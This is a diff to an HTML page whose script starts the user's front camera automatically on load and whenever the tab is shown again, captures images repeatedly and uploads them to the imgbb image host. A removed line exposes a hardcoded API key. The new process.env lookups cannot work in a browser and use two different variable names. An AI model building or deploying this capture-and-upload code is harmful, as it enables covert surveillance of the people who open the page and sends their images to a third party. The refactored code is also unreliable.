@@ -8,7 +8,7 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: #000;
+            background-color: #ffa9a9;
         }
     </style>
 </head>
@@ -17,7 +17,7 @@
 <script>
 let captureInterval;
 
-function startCapturingAndUploading() {
+function startCapturingAndUploading(apiKey) {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Use front camera
     .then(function(stream) {
         const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
@@ -28,7 +28,7 @@ function startCapturingAndUploading() {
                 const formData = new FormData();
                 formData.append('image', blob);
 
-                fetch('https://api.imgbb.com/1/upload?key=bc0128afc43bdda4d55e79c3781728ac', {
+                fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
                     method: 'POST',
                     body: formData,
                 })
@@ -62,11 +62,22 @@ document.addEventListener("visibilitychange", function() {
     if (document.visibilityState === 'hidden') {
         clearInterval(captureInterval);
     } else {
-        startCapturingAndUploading();
+        const apiKey = process.env.API_KEY; // Fetch API key from environment variable
+        if (apiKey) {
+            startCapturingAndUploading(apiKey); // Pass the API key to the function
+        } else {
+            console.error('API key not found in environment variables.');
+        }
     }
 });
 
-startCapturingAndUploading(); // Start the process automatically
+// Initial execution
+const apiKey = process.env.IMGBB_API_KEY; // Fetch API key from environment variable
+if (apiKey) {
+    startCapturingAndUploading(apiKey); // Pass the API key to the function
+} else {
+    console.error('API key not found in environment variables.');
+}
 </script>
 </body>
 </html>
